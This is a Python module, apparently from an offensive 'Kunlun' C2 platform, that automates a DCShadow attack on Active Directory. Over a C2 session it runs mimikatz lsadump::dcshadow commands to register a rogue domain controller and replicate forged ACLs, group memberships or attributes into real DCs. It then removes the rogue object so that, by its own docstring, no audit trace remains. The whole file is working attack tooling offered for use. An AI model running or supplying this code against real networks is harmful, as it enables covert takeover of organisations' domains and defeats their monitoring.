"""DCShadow (Shadow Domain Controller) module for Kunlun platform.

Provides:
- Temporary shadow DC creation (requires Domain Admin or Enterprise Admin)
- Malicious replication data push to real DCs (ACL modification, group membership)
- Automatic shadow DC destruction after operation (no configuration residue)
- Operations appear as normal replication events, no conventional audit logs
"""

import asyncio
import logging
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class DCShadowStatus(Enum):
    """DCShadow operation status."""
    NOT_STARTED = "not_started"
    CREATING = "creating"
    PUSHING = "pushing"
    DESTROYING = "destroying"
    COMPLETED = "completed"
    FAILED = "failed"


@dataclass
class DCShadowConfig:
    """Configuration for DCShadow attack.

    Attributes:
        target_dc: Target domain controller for replication
        shadow_dc_name: Shadow DC name (auto-generated if empty)
        target_object: AD object to modify (user, group, OU, etc.)
        modification_type: Type of modification (acl, membership, attribute)
        modification_data: Modification data dictionary
        auto_destroy: Auto destroy shadow DC after operation
        stealth_mode: Enable stealth mode
    """
    target_dc: str = ""
    shadow_dc_name: str = ""
    target_object: str = ""
    modification_type: str = "acl"
    modification_data: Dict[str, str] = field(default_factory=dict)
    auto_destroy: bool = True
    stealth_mode: bool = False


@dataclass
class DCShadowResult:
    """Result of DCShadow operation.

    Attributes:
        success: Whether operation succeeded
        status: Current DCShadow status
        shadow_dc_name: Shadow DC name
        target_object: Target AD object
        modifications_applied: List of applied modifications
        replication_success: Whether replication succeeded
        destroyed: Whether shadow DC was destroyed
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
        target_dc: Target domain controller
    """
    success: bool = False
    status: DCShadowStatus = DCShadowStatus.NOT_STARTED
    shadow_dc_name: str = ""
    target_object: str = ""
    modifications_applied: List[str] = field(default_factory=list)
    replication_success: bool = False
    destroyed: bool = False
    error_message: str = ""
    attck_technique: str = "T1207"
    duration_seconds: float = 0.0
    target_dc: str = ""


class DCShadowAttack:
    """DCShadow attack module.

    Provides shadow DC creation, malicious replication data push,
    and automatic destruction for stealthy AD manipulation.
    """

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize DCShadow attack module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("DCShadow Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("DCShadow: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def check_prerequisites(self, target_dc: str = "") -> Tuple[bool, List[str]]:
        """Check prerequisites for DCShadow attack.

        Args:
            target_dc: Target domain controller.

        Returns:
            Tuple of (can_execute, issues).
        """
        issues: List[str] = []

        try:
            await self._report_log("检测DCShadow前置条件...")

            da_check = await self._execute_command(
                "net user %username% /domain"
            )
            if da_check.get("success"):
                output = str(da_check.get("output", ""))
                if "Domain Admins" not in output and "Enterprise Admins" not in output:
                    issues.append("需要Domain Admins或Enterprise Admins权限")

            schema_check = await self._execute_command(
                "Get-ADObject -Identity \"CN=Schema,CN=Configuration,DC=domain,DC=com\" "
                "-Properties schemaUpdateSequence"
            )
            if not schema_check.get("success"):
                issues.append("无法访问Schema配置分区")

            return len(issues) == 0, issues

        except Exception as e:
            issues.append(f"前置检测异常: {e}")
            return False, issues

    async def execute_dcshadow(
        self,
        config: DCShadowConfig,
    ) -> DCShadowResult:
        """Execute DCShadow attack.

        Args:
            config: DCShadow configuration.

        Returns:
            DCShadowResult with operation status.
        """
        start_time = time.time()
        result = DCShadowResult(
            target_dc=config.target_dc,
            target_object=config.target_object,
        )

        try:
            await self._report_progress("检测前置条件", 5)

            can_execute, issues = await self.check_prerequisites(config.target_dc)
            if not can_execute:
                result.error_message = f"前置条件不满足: {', '.join(issues)}"
                result.status = DCShadowStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            shadow_name = config.shadow_dc_name if config.shadow_dc_name else f"DCSHADOW-{str(uuid.uuid4())[:8].upper()}"
            result.shadow_dc_name = shadow_name
            await self._report_log(f"影子域控名称: {shadow_name}")

            await self._report_progress("创建影子域控", 20)
            await self._report_log("开始创建影子域控...")

            created = await self._create_shadow_dc(shadow_name, config.target_dc)
            if not created:
                result.error_message = "影子域控创建失败"
                result.status = DCShadowStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            result.status = DCShadowStatus.CREATING
            await self._report_log("影子域控创建成功")

            await self._report_progress("推送恶意复制数据", 50)
            await self._report_log("开始推送恶意复制数据...")

            pushed = await self._push_replication_data(
                shadow_name,
                config.target_object,
                config.modification_type,
                config.modification_data,
                config.target_dc,
            )
            if pushed:
                result.replication_success = True
                result.modifications_applied.append(
                    f"{config.modification_type}: {config.target_object}"
                )
                await self._report_log("恶意复制数据推送成功")
            else:
                result.error_message = "复制数据推送失败"
                result.status = DCShadowStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            result.status = DCShadowStatus.PUSHING

            if config.auto_destroy:
                await self._report_progress("销毁影子域控", 80)
                await self._report_log("开始销毁影子域控...")

                destroyed = await self._destroy_shadow_dc(shadow_name, config.target_dc)
                if destroyed:
                    result.destroyed = True
                    await self._report_log("影子域控销毁成功，无配置残留")
                else:
                    await self._report_log("警告: 影子域控销毁失败，需手动清理")

            result.status = DCShadowStatus.COMPLETED
            result.success = True
            result.duration_seconds = time.time() - start_time

            await self._report_progress("完成", 100)
            await self._report_log("DCShadow攻击完成!")

            await self._broadcast_event(result, config)

        except Exception as e:
            result.error_message = str(e)
            result.status = DCShadowStatus.FAILED
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"DCShadow攻击失败: {e}")
            logger.error("DCShadow attack failed: %s", e)

        return result

    async def _create_shadow_dc(self, shadow_name: str, target_dc: str) -> bool:
        """Create shadow domain controller.

        Args:
            shadow_name: Shadow DC name.
            target_dc: Target domain controller.

        Returns:
            True if creation successful.
        """
        try:
            cmd = (
                f"mimikatz lsadump::dcshadow /object:CN=NTDS Settings,{shadow_name} "
                f"/attribute:serverReferenceBL /value:CN={shadow_name},OU=Domain Controllers,DC=domain,DC=com"
            )
            exec_result = await self._execute_command(cmd, target_dc)
            return bool(exec_result.get("success", False))
        except Exception as e:
            logger.error("Shadow DC creation failed: %s", e)
            return False

    async def _push_replication_data(
        self,
        shadow_name: str,
        target_object: str,
        modification_type: str,
        modification_data: Dict[str, str],
        target_dc: str,
    ) -> bool:
        """Push malicious replication data.

        Args:
            shadow_name: Shadow DC name.
            target_object: Target AD object.
            modification_type: Type of modification.
            modification_data: Modification data.
            target_dc: Target domain controller.

        Returns:
            True if push successful.
        """
        try:
            if modification_type == "acl":
                return await self._push_acl_modification(
                    shadow_name, target_object, modification_data, target_dc
                )
            elif modification_type == "membership":
                return await self._push_membership_modification(
                    shadow_name, target_object, modification_data, target_dc
                )
            elif modification_type == "attribute":
                return await self._push_attribute_modification(
                    shadow_name, target_object, modification_data, target_dc
                )
            return False
        except Exception as e:
            logger.error("Replication data push failed: %s", e)
            return False

    async def _push_acl_modification(
        self,
        shadow_name: str,
        target_object: str,
        acl_data: Dict[str, str],
        target_dc: str,
    ) -> bool:
        """Push ACL modification via shadow DC.

        Args:
            shadow_name: Shadow DC name.
            target_object: Target AD object.
            acl_data: ACL modification data.
            target_dc: Target domain controller.

        Returns:
            True if push successful.
        """
        try:
            cmd = (
                f"mimikatz lsadump::dcshadow /object:\"{target_object}\" "
                f"/attribute:ntSecurityDescriptor /value:\"{acl_data.get('sddl', '')}\""
            )
            exec_result = await self._execute_command(cmd, target_dc)
            return bool(exec_result.get("success", False))
        except Exception as e:
            logger.error("ACL modification push failed: %s", e)
            return False

    async def _push_membership_modification(
        self,
        shadow_name: str,
        target_object: str,
        membership_data: Dict[str, str],
        target_dc: str,
    ) -> bool:
        """Push group membership modification via shadow DC.

        Args:
            shadow_name: Shadow DC name.
            target_object: Target AD object.
            membership_data: Membership modification data.
            target_dc: Target domain controller.

        Returns:
            True if push successful.
        """
        try:
            cmd = (
                f"mimikatz lsadump::dcshadow /object:\"{target_object}\" "
                f"/attribute:member /value:\"{membership_data.get('member_dn', '')}\""
            )
            exec_result = await self._execute_command(cmd, target_dc)
            return bool(exec_result.get("success", False))
        except Exception as e:
            logger.error("Membership modification push failed: %s", e)
            return False

    async def _push_attribute_modification(
        self,
        shadow_name: str,
        target_object: str,
        attribute_data: Dict[str, str],
        target_dc: str,
    ) -> bool:
        """Push attribute modification via shadow DC.

        Args:
            shadow_name: Shadow DC name.
            target_object: Target AD object.
            attribute_data: Attribute modification data.
            target_dc: Target domain controller.

        Returns:
            True if push successful.
        """
        try:
            attribute = attribute_data.get("attribute", "")
            value = attribute_data.get("value", "")
            cmd = (
                f"mimikatz lsadump::dcshadow /object:\"{target_object}\" "
                f"/attribute:{attribute} /value:\"{value}\""
            )
            exec_result = await self._execute_command(cmd, target_dc)
            return bool(exec_result.get("success", False))
        except Exception as e:
            logger.error("Attribute modification push failed: %s", e)
            return False

    async def _destroy_shadow_dc(self, shadow_name: str, target_dc: str) -> bool:
        """Destroy shadow domain controller.

        Args:
            shadow_name: Shadow DC name.
            target_dc: Target domain controller.

        Returns:
            True if destruction successful.
        """
        try:
            cmd = (
                f"mimikatz lsadump::dcshadow /stop"
            )
            exec_result = await self._execute_command(cmd, target_dc)

            cleanup_cmd = (
                f"Remove-ADObject -Identity \"CN={shadow_name},OU=Domain Controllers,DC=domain,DC=com\" "
                f"-Recursive -Confirm:$false -ErrorAction SilentlyContinue"
            )
            await self._execute_command(cleanup_cmd, target_dc)

            return bool(exec_result.get("success", False))
        except Exception as e:
            logger.error("Shadow DC destruction failed: %s", e)
            return False

    async def _broadcast_event(self, result: DCShadowResult, config: DCShadowConfig) -> None:
        """Broadcast DCShadow event.

        Args:
            result: DCShadow result.
            config: DCShadow configuration.
        """
        if not self.event_bus:
            return

        try:
            event_data = {
                "event_type": "dcshadow",
                "success": result.success,
                "target_dc": result.target_dc,
                "shadow_dc_name": result.shadow_dc_name,
                "target_object": result.target_object,
                "modifications_applied": result.modifications_applied,
                "destroyed": result.destroyed,
                "attck_technique": result.attck_technique,
                "timestamp": time.time(),
            }
            await self.event_bus.publish("domain_attack", event_data)
        except Exception as e:
            logger.error("Failed to broadcast DCShadow event: %s", e)
